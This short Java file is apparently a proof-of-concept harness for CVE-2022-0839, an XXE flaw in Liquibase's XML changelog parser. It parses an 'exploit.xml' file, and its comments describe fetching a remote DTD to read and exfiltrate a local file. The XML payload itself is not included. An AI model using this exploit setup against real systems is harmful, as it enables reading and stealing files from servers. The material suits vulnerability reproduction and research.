package com.anonuser;

import java.io.File;

import liquibase.changelog.ChangeLogParameters;
import liquibase.exception.ChangeLogParseException;
import liquibase.parser.core.xml.XMLChangeLogSAXParser;
import liquibase.resource.FileSystemResourceAccessor;

public class Liquibase_CVE_2022_0839 {
    
    public static void main(String[] args) {
        
        // Uses network connection to read the xxe.dtd file. Also reads the expose.txt file from the filesystem and exfiltrates its contents
        // Requires an http server serving xxe.dtd and expose.txt from the test-server directory
        // I use "python3 -m http.server 8080 --directory test-server" to serve the files
        System.out.println("Exploiting CVE-2022-0839");
        XMLChangeLogSAXParser parser = new XMLChangeLogSAXParser();
        try {
            parser.parse("exploit.xml", 
            new ChangeLogParameters(), new FileSystemResourceAccessor(new File[] {new File("src/main/files")}));

        } catch (ChangeLogParseException e) {
            e.printStackTrace();
        }
    }
}
